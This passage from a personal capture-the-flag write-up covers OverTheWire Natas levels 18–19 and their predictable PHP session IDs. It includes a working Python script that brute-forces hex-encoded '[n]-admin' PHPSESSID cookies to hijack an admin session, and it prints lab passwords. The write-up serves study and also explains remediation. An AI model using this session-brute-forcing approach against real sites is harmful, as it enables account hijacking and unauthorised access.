- **Failed Attempt:** There wasn't really any failure but the presence of a login form and the `isValidAdminLogin()` function suggested a direct authentication bypass might be the goal caused me to be stuck on it.
- **Why it Failed:** The realisation that `isValidAdminLogin()` always returned 0 meant the path of using the login form was a dead end for gaining admin privileges. 
- **Overcoming Adversity**: The realisation made me shift my focus away from traditional login bypass methods and thoroughly analyse the rest of the session management code.
- **What I Learned:** This reinforced the importance of thorough source code analysis to identify disabled or misleading functionalities early, preventing time spent on non-existent vulnerabilities. It taught me to look for where the control flow could be manipulated if direct authentication was blocked, leading me to the session ID generation.

**Vulnerability & Real-World Impact**
- **Root Cause:** The application relies on a highly predictable and low-entropy random number generator (`rand()`) to create session IDs, combined with a very small range (`1` to `640`). This makes session IDs easily guessable. An attacker can simply iterate through all possible IDs until an authenticated session is found.
- **Real-World Scenario:** An e-commerce site using predictable session IDs. An attacker could brute-force session IDs to hijack customer accounts, view sensitive order history, or even make unauthorised purchases.
- **Risk:** High, since predictable session IDs lead to session fixation or session prediction attacks, allowing attackers to impersonate legitimate users, including administrators, without needing their credentials. This can result in full account compromise, data breaches, and complete control over the affected system.

**Remediate & Security Engineering Principles**
- **Remediation**: Use Cryptographically Secure Random Number Generators (CSPRNGs) such as `random_bytes()` in PHP this is because standard pseudorandom number generators (PRNGs) like `rand()` or `mt_rand()` are not cryptographically secure and knowing the seed value you can predict future outputs. Utilise `session_regenerte_id(true)` upon authentication to prevent session fixation attacks where an attacker could provide a known session ID.
- **Principle Illustrated:** Principle of Least Privilege is violated due to predictable sessions allowing attacker to access session they shouldn't be able to. Secure by Design is violated due to insecure and weak randomness in the generation of session IDs. 

**Personal Reflection & Growth**
- **What I Found Challenging:** The main challenge was being fixated on the login form which turned out to be a red herring. It was difficult to shift away from focusing on traditional authentication bypass methods and instead analyse the subtle mechanics of session handling, particularly how an `admin = 1` state could persist in `$_SESSION` even though the `isValidAdminLogin()` function was disabled.
- **Connecting to Future Challenges:** This challenge was a powerful demonstration of how seemingly innocuous functions (like `rand()`) can introduce critical vulnerabilities when used in security-sensitive contexts. It cemented my understanding of the importance of high-entropy random numbers in cryptography and session management. I will now always closely inspect session ID generation mechanisms.
- **Growth:** This solidified my understanding of session management vulnerabilities beyond simple authentication bypass. I learned to identify predictable session IDs as a severe attack vector and gained practical experience in exploiting them. Furthermore, it highlighted the critical role of entropy in secure system design and similar to previous challenges, reiterated necessity of automation for efficient security testing. Crucially, this level deepened my knowledge of the fundamental difference between Pseudo-Random Number Generators (PRNGs) like `rand()` and Cryptographically Secure Random Number Generators (CSPRNGs) like `random_bytes()`. I now understand that PRNGs, while sufficient for many tasks, are inherently predictable given enough output or knowledge of their seed, making them entirely unsuitable for security-sensitive applications like session ID generation where true unpredictability is paramount to prevent attacks.
---

## Level 18 → Level 19
**Vulnerability**: Session Management (Predictable Session IDs / Session Fixation)
**Thought Process**: The page differed to the previous challenge with the addition of the paragraph "**This page uses mostly the same code as the previous level, but session IDs are no longer sequential...**". With no source code provided, my immediate focus shifted to observed application behavior, particularly the `PHPSESSID` cookie, given the previous challenge. I logged in with a dummy username ("admin") and observed the `PHPSESSID` cookie value: `3231322d61646d696e`. After decoding `3231322d61646d696e` to `212-admin`, and subsequent observations yielding `326-admin` and `173-admin`, I saw a pattern. The structure `[number]-admin` suggested a number prepended to a fixed string, with the entire string then hex-encoded. Given Natas18's use of `rand(1, 640)`, I hypothesised the numeric part would again be within the 1-640 range.

**Methodology & Execution**
- **Tools Used:** Browser (for observing cookies and manual hex decoding), Python
- **Step-by-Step Execution:**
	1. Analysed the `PHPSESSID` cookie after submitting the login form.
	2. Noticed values like `3231322d61646d696e` and decoded the hex string to ASCII, revealing the `212-admin`.
	3. Repeated this for other observed cookies `3332362d61646d696e` -> `326-admin` and `3238312d61646d696e` -> `281-admin`.
	4. Hypothesised the session ID format was `[integer]-admin` and was hex-encoded. The consistent numerical range similar to Natas18's `maxid=640` suggested brute-forcing the integer from 1 to 640.
	5. Developed Python Script that was adapted from the previous brute-forcing script to generate the `[integer]-admin `string, hex-encode it, and then set it as the `PHPSESSID` cookie:
		```Python
		import requests  
		  
		TARGET = 'http://natas19.natas.labs.overthewire.org/index.php'  
		AUTH = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')  
		MAX_SESSION_ID = 640  
		  
		print("Attempting to brute-force PHPSESSID for Natas19")  
		  
		for i in range(1, MAX_SESSION_ID + 1):  
		    # Craft the session ID by encoding "X-admin" to hexadecimal  
		    session_id_string = f"{i}-admin"  
		    hex_session_id = session_id_string.encode('utf-8').hex()  
		  
		    cookies = {  
		        'PHPSESSID': hex_session_id  
		    }  
		  
		    response = requests.get(TARGET, auth=AUTH, cookies=cookies)  
		  
		    if response:  
		        print(f"  Testing PHPSESSID: {hex_session_id} (from string: '{session_id_string}')...")  
		  
		    # Check if the "admin" success message is in the response  
		    if "You are an admin." in response.text:  
		        print(f"\nFound admin PHPSESSID: {hex_session_id}")  
		        print("\nCredentials for Natas20")  
		        # Extract and print the relevant part of the response  
		        start_index = response.text.find("Username: natas20")  
		        end_index = response.text.find("</pre>")  
		        if start_index != -1 and end_index != -1:  
		            print(response.text[start_index:end_index].strip())  
		        else:  
		            print(response.text)  # Fallback if text not found  
		        break  # Stop once the admin session is found  
		else:  
		    print(f"\nFailed to find admin PHPSESSID within the range 1-{MAX_SESSION_ID}")
		```
	
		The script identified the admin session corresponding to `281-admin` (`3238312d61646d696e`) and extracted Natas20's password: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`.

	The "Aha!" moment came from manually decoding the observed `PHPSESSID` cookie, which revealed the `[number]-admin` pattern, confirming the attack vector was a variation of predictable session IDs from the previous level, obscured by hex encoding.

**Rabbit Holes & Overcoming Adversity**
- **Challenge Encountered:** The primary challenge was the absence of source code, meaning the predictable session ID pattern observed in Natas18 was not immediately obvious and was further obscured by hex encoding.
- **Overcoming Adversity**: This was overcome by inspecting the `PHPSESSID` cookie in the developer tools. By manually decoding the hexadecimal string, the underlying `[number]-admin` pattern became clear. This deduction, combined with knowledge from Natas18's `maxid=640` led to the brute-force strategy.
- **What I Learned:** This reinforced the importance of low-level HTTP traffic analysis and manual decoding techniques when source code is unavailable. It highlighted that even simple encoding can obscure a clear pattern, and that careful observation of all data formats is essential for successful exploitation.

**Vulnerability & Real-World Impact**
- **Root Cause:** The core vulnerability is still the use of a low-entropy, predictable component (an integer between 1 and 640, likely generated by a PRNG like rand()) in the generation of session IDs. The hex encoding merely obscures this predictability, but does not add any cryptographic strength. The server concatenates this weak random number with a fixed string (`-admin`) and then hex-encodes it, making the entire ID trivial to guess through brute-force.
- **Real-World Scenario:** A web application that generates "unique" identifiers for resources like invoices or user profiles by concatenating a sequential or easily guessable number with a fixed string, and then perhaps base64-encodes the result. An attacker could enumerate these identifiers by guessing the predictable components, leading to unauthorised access to sensitive data (Insecure Direct Object Reference, IDOR).
- **Risk:** High as predictable session IDs, regardless of encoding, allow for session hijacking and impersonation, leading to full account compromise. The hex encoding adds a minor layer of obscurity but no real security, as the underlying entropy is low.

**Remediate & Security Engineering Principles**
- **Remediation**: Use Cryptographically Secure Random Number Generators (CSPRNGs) such as `random_bytes()` in PHP to ensure high entropy and unpredictability. Avoid predictable components like low-entropy numbers or fixed strings into session IDs, the entire ID should be a random, unguessable string.
- **Principle Illustrated:** Defence in Depth and Secure by Design was violated due to the hex encoding being a weak layer of obscurity, easily bypassed. This demonstrates that security is not about obscurity but about fundamental cryptographic strength (high entropy).

**Personal Reflection & Growth**
- **What I Found Challenging:** The challenge was straightforward and after cookie observation the method to find the answer became obvious.
- **Connecting to Future Challenges:** It reinforced the need to carefully examine all data exchanged with the server, including cookie formats and encodings, as these often contain critical clues.
- **Growth:** This reinforced my understanding that security isn't about obscurity. While the `[number]-admin` pattern and hex encoding might have been intended to add complexity, it served as a weak "salt" or obfuscation that did not fundamentally address the underlying low-entropy random number generation. Once again it reinforced that robust security relies on strong, unpredictable randomness, not just encoding or fixed strings.


---